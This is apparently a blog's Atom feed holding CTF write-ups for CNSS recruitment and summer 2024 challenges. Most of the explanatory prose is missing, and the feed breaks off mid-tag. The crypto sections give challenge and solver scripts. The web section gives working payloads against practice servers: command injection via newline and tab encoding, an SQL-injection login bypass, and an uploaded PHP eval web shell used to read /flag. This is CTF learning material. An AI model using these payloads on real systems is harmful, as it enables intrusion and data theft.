    <summary type="html">&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;CRYPTO&lt;/code&gt;&lt;code&gt;wp&lt;/code&gt;&lt;br /&gt;
&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>cnss-recruit-2024</title>
    <link href="https://hvang10.github.io/2024/10/10/cnss-recruit-2024/"/>
    <id>https://hvang10.github.io/2024/10/10/cnss-recruit-2024/</id>
    <published>2024-10-10T02:52:46.000Z</published>
    <updated>2025-03-21T17:42:14.866Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pqgcg6fs2k6.feishu.cn/wiki/Z93RwKTZZiYftskDqbAcDyyenkh?from=from_copylink"></a><br /></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">flag = getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chal</span>():</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    phi = e</span><br><span class="line">    <span class="keyword">while</span> GCD(e, phi) != <span class="number">1</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Alice -&gt; Bob :The public key  &#123;&#123;&#x27;n&#x27;:<span class="subst">&#123;<span class="built_in">hex</span>(n)&#125;</span>,&#x27;e&#x27;:<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    mess = <span class="string">b&quot;I l0ve you---Bob&quot;</span></span><br><span class="line">    m = long_to_bytes(mess)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Bob -&gt; Alice :The encrypted message &#123;&#123;&#x27;c&#x27;:<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">pow</span>(m,e,n))&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can change the message Bob sent to Alice to help them study&quot;</span>)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the encrypted message (in hex)&quot;</span>),<span class="number">16</span>)</span><br><span class="line">    message = bytes_to_long(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">b&quot;Please keep away from me, I had to study hard&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chal()</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo></mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">message\equiv c^{d}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c\equiv (message)^{e}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 94933879657019461326828225836780893807400776971235851915066913763683310991309173340557406241075423730347734496950200533575670368627940332981373490699790129749566410150515572724861054835984481560010703671000134856172771048226985683127931612726872883032424421652451138053080169329061035399029500996664744339122</span></span><br><span class="line"><span class="string">p = 95855494001984957858370499068727677198914989191424438110665096413160144326163172754989614826773164540454657124564339977787908884977761972381683644262327181870316948741995100389232827854834171961842471759416662384703036141181130961351694018591639607368956764660290603455362026824834672239118472771981866952759</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, p-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, p)).decode())</span><br></pre></td></tr></table></figure><p>PS: </p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">N = <span class="number">2</span>**<span class="number">32</span></span><br><span class="line"></span><br><span class="line">a = randint(<span class="number">1</span>, N)</span><br><span class="line">b = randint(<span class="number">1</span>, N)</span><br><span class="line">seed = randint(<span class="number">1</span>, N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * a + b) % N</span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">10</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    lst.append(gen())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lst[:<span class="number">3</span>])</span><br><span class="line">flag = <span class="string">&quot;cnss&#123;&quot;</span> + sha256(<span class="built_in">str</span>(lst).encode()).digest().<span class="built_in">hex</span>() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1191871952, 424959397, 2071728008]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>LCG</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * a + b) % N</span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">lst = [<span class="number">1191871952</span>, <span class="number">424959397</span>, <span class="number">2071728008</span>]</span><br><span class="line">a = (lst[<span class="number">2</span>]-lst[<span class="number">1</span>]) * inverse(lst[<span class="number">1</span>]-lst[<span class="number">0</span>], N) % N</span><br><span class="line">b = (lst[<span class="number">1</span>] - a * lst[<span class="number">0</span>]) % N</span><br><span class="line">seed = (lst[<span class="number">0</span>]-b)*inverse(a, N) % N</span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    lst.append(gen())</span><br><span class="line">flag = <span class="string">&quot;cnss&#123;&quot;</span> + sha256(<span class="built_in">str</span>(lst).encode()).digest().<span class="built_in">hex</span>() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, getRandomNBitInteger</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&quot;th3ory&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">35</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e1 = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">e2 = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e2 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c2 = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 6515170721824235610077767341836933885840875127391251414241431058649905695517146798474612659595551169142861886184506103913942899261023340287984546344722437</span></span><br><span class="line"><span class="string">e1 = 7629805664186543656889446705637291540349114025875443716836563834859596597787836018342790489334721556488151377780074075791508513529215301207684062773549978</span></span><br><span class="line"><span class="string">e2 = 9039921587803845152307464731958928360172176091850551461858009351504282865228004545395872265680096691496208319524680982403075570587404216482639595725937778</span></span><br><span class="line"><span class="string">c1 = 4051037378975864795768433612586859935577401638900306752031195646978965789412075981397854666117503427453968376495404896921769061877453267600673695437655064</span></span><br><span class="line"><span class="string">c2 = 1553033793693524308294676475858121205684586044416915406366461468291436664838155112756117928278740586233365774778368046411859650684761456474837957111920903</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>e</code><code>GCD(e1,e2)=2</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">6515170721824235610077767341836933885840875127391251414241431058649905695517146798474612659595551169142861886184506103913942899261023340287984546344722437</span></span><br><span class="line">e1 = <span class="number">7629805664186543656889446705637291540349114025875443716836563834859596597787836018342790489334721556488151377780074075791508513529215301207684062773549978</span></span><br><span class="line">e2 = <span class="number">9039921587803845152307464731958928360172176091850551461858009351504282865228004545395872265680096691496208319524680982403075570587404216482639595725937778</span></span><br><span class="line">c1 = <span class="number">4051037378975864795768433612586859935577401638900306752031195646978965789412075981397854666117503427453968376495404896921769061877453267600673695437655064</span></span><br><span class="line">c2 = <span class="number">1553033793693524308294676475858121205684586044416915406366461468291436664838155112756117928278740586233365774778368046411859650684761456474837957111920903</span></span><br><span class="line">s, x, y = gmpy2.gcdext(e1, e2)</span><br><span class="line">m_2 = (<span class="built_in">pow</span>(c1, x, n)*<span class="built_in">pow</span>(c2, y, n)) % n</span><br><span class="line">m_high = bytes_to_long(<span class="string">b&#x27;cnss&#123;&#x27;</span>)</span><br><span class="line">m_low = bytes_to_long(<span class="string">b&#x27;th3ory&#125;&#x27;</span>)</span><br><span class="line">R.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = ((m_high &lt;&lt; <span class="number">240</span>)+x*<span class="number">2</span> ^ <span class="number">56</span>+m_low)^<span class="number">2</span>-m_2</span><br><span class="line">f = f.monic()</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span> ^ <span class="number">184</span>, beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    m = (m_high &lt;&lt; <span class="number">240</span>)+<span class="built_in">int</span>(root)*<span class="number">2</span> ^ <span class="number">56</span>+m_low</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag_pic = f.read()</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher  = AES.new(key = key, mode = AES.MODE_OFB, iv = os.urandom(<span class="number">16</span>))</span><br><span class="line">enc_pic = cipher.encrypt(pad(flag_pic, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;key = <span class="subst">&#123;key&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;enc_pic = <span class="subst">&#123;enc_pic&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://hvang10.github.io/2024/07/13/OSCTF2024/">Sheep Counting</a><code>ECB</code><code>OFB</code><code>iv</code><code>OFB</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line">key = <span class="string">b&#x27;k\x18\xb9\xd2\x1f\xfb\xe8\nrz\xfaV\xd7\x1dB\xe4&#x27;</span></span><br><span class="line">enc_pic = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line">png_head = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;89504e470d0a1a0a0000000d49484452&#x27;</span>)</span><br><span class="line">iv = xor(enc_pic[:<span class="number">16</span>], png_head)</span><br><span class="line">aes = AES.new(key=key, mode=AES.MODE_OFB, iv=iv)</span><br><span class="line">flag = png_head+aes.decrypt(enc_pic[<span class="number">16</span>:])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag)</span><br></pre></td></tr></table></figure><h2 id="-"><a class="markdownIt-Anchor" href="#-"></a>  ()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">flag = getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prod</span>(<span class="params">ells</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> ells == [] <span class="keyword">else</span> ells[<span class="number">0</span>] * prod(ells[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = <span class="number">2</span> * prod([getPrime(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">past = <span class="string">b&quot;Welcome to cnss recruitment 2024!&quot;</span></span><br><span class="line">now = <span class="string">b&quot;Congratulations! We hope you can join us!&quot;</span></span><br><span class="line"></span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter your code to pass the time! &gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([c == <span class="string">&quot;+&quot;</span> <span class="keyword">or</span> c == <span class="string">&quot;*&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> code]) <span class="keyword">and</span> <span class="built_in">len</span>(code) &lt; <span class="number">512</span></span><br><span class="line"></span><br><span class="line">past = <span class="built_in">int</span>(hashlib.sha256(past).hexdigest(), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        past = past + past</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        past = past * past</span><br><span class="line">    past %= p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> past == <span class="built_in">int</span>(hashlib.sha256(now).hexdigest(), <span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;You make it! The flag is <span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>nc 152.136.11.155 10065</code></p><p><code>past</code>2<code>p</code><code>now</code><br /></p><h2 id="else"><a class="markdownIt-Anchor" href="#else"></a> else</h2><p><strong>XSCTF2025</strong>()</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><p></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  ()</h2><p><strong>SUID</strong><code>curl</code><code>curl</code></p><h2 id="c"><a class="markdownIt-Anchor" href="#c"></a> C++</h2><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.cpp&quot;</span>, <span class="string">&#x27;r&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;CNSS&#123;&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(content)-<span class="number">14</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= j &lt;= <span class="number">9</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">27</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">10</span> &lt;= j &lt;= <span class="number">99</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">28</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">100</span> &lt;= j &lt;= <span class="number">999</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">29</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">1000</span> &lt;= j &lt;= <span class="number">9999</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">30</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">10000</span> &lt;= j &lt;= <span class="number">99999</span>:</span><br><span class="line">            num = content[<span class="number">13</span>+i][<span class="number">26</span>:<span class="number">31</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> num != <span class="built_in">str</span>(j):</span><br><span class="line">            <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="c"><a class="markdownIt-Anchor" href="#c"></a>  </h2><p><code></code><br /><a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">http://www.mytju.com/classcode/tools/messycoderecover.asp</a><br /><code></code><br /><code>cnss&#123;108308852066307765011448867519&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://pqgcg6fs2k6.feishu.cn/wiki/Z93RwKTZZiYftskDqbAcDyyenkh?from=from_copylink&quot;&gt;&lt;/a&gt;&lt;br /&gt;
&lt;/p&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CNSS Summer 2024 WriteUp</title>
    <link href="https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/09/07/CNSS-Summer-2024-WriteUp/</id>
    <published>2024-09-07T13:50:47.000Z</published>
    <updated>2025-08-18T20:03:40.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="babyhttp"><a class="markdownIt-Anchor" href="#babyhttp"></a>  babyHTTP</h2><p><code>GET POST Cookie</code><code>HTTP</code></p><p><img src="https://picx.zhimg.com/80/v2-3f2ab642ac73aab5f8fe835442e3aa66_1440w.png" alt="" /></p><h2 id="-phpinfo"><a class="markdownIt-Anchor" href="#-phpinfo"></a>  PHPinfo</h2><p><code>phpinfo()</code></p><p><code>http://111.229.23.244:50002/phpinfo.php</code><br /><code>ctrl+f</code><code>cnss</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><p><code>Key</code><code>md5</code><code>Python</code><code>payload</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">url = <span class="string">&#x27;http://152.136.11.155:10103&#x27;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(url, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Key</span></span><br><span class="line">    pattern = <span class="string">r&#x27;Key : (\w+)&#x27;</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    s = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">str</span> = md5(s.encode()).hexdigest()</span><br><span class="line">    url = <span class="string">f&#x27;http://152.136.11.155:10103/check?value=<span class="subst">&#123;<span class="built_in">str</span>&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code></code></p><h2 id="ping"><a class="markdownIt-Anchor" href="#ping"></a>  Ping</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ping_result</span> = <span class="title function_ invoke__">ping</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="variable">$ping_result</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p><code>;|</code><code>%0a</code><code>%09</code><br /><code>post: ip=127.0.0.1%0acat%09/f*</code></p><p><code>127.0.0.1 %0a ls %09 cat *</code></p><h2 id="cnss"><a class="markdownIt-Anchor" href="#cnss"></a>  CNSS</h2><p><br /><code>admin    1'or'1'='1</code></p><p><code>SQL</code></p><h2 id="2048"><a class="markdownIt-Anchor" href="#2048"></a>  2048</h2><p><code>bp</code>()</p><p><code>js</code><code>F12</code><code>Flag</code><code>F12</code></p><p><code>flag</code>()<code>js</code><code>score</code>()</p><p><br /><img src="https://pic1.zhimg.com/80/v2-69c1d329ccb815b861cd1181f95d1828_1440w.png" alt="" /><br /></p><p><code>js</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><p><br /><code>1.png</code><code>&lt;?php eval($_GET['1']);?&gt;</code></p><p><code>bp</code><code>1.php</code></p><p><br /><code>http://152.136.11.155:10107/avatars/a799bfa76e49bb0e43190454ff941710/1.php?1=system(&quot;cat /flag&quot;);</code></p><p><code>cnss&#123;D4ng3r0us_Fl13_UpI0ad!&#125;</code><br 